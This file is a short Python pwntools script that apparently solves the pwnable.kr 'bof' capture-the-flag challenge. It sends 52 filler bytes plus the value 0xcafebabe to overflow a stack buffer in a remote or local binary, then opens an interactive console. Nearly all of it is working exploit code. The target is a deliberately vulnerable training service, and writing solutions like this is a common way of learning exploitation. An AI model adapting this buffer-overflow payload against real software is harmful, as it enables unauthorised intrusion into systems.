#!/usr/bin/python
import sys
import time
import argparse
from pwn import *
context.update(arch='i386', os='linux')

def wait_for_prompt(r):
  print r.recvuntil("overflow me :")

def wait_newline_and_dump(r):
  data = r.recvuntil('\n')
  if data:
    print data.encode('hex')
    print data
  return data

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  parser.add_argument('--remote', '-r', action="store_true")
  args = parser.parse_args()

  if args.remote:
    r = remote('pwnable.kr', 9000)
  else:
    r = process('./bof')

  if args.dbg:
    gdb.attach(r, """
    vmmap
    b *func+40
    """)

  #wait_for_prompt(r)
  payload  = "A"*52
  payload += p32(0xcafebabe)
  r.sendline(payload) 
  # Drop to interactive console
  r.interactive()

